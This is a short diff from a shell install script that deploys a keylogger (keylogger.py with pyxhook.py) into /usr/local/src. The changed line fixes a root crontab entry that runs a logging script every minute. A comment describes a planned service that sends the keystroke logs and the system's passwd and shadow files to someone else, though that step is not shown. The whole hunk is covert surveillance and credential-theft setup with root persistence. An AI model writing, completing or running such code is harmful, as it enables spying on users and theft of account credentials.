@@ -99,7 +99,7 @@ chmod +x log.sh
 mv log.sh /usr/local/src/
 mv keylogger.py /usr/local/src/
 mv pyxhook.py /usr/local/src/
-echo "* * * * * /usr/local/src/log.sh /var/log/cron/log.log 2>&1" >> /var/spool/cron/crontabs/root
+echo "* * * * * /usr/local/src/log.sh >> /var/log/cron/log.log 2>&1" >> /var/spool/cron/crontabs/root
 
 # setup service that sends logging, passwd, and shadow file to someone else
 # TODO: setup dest box to receive files - use static ip UPDATE: not needed - I'll just keep the box on lol
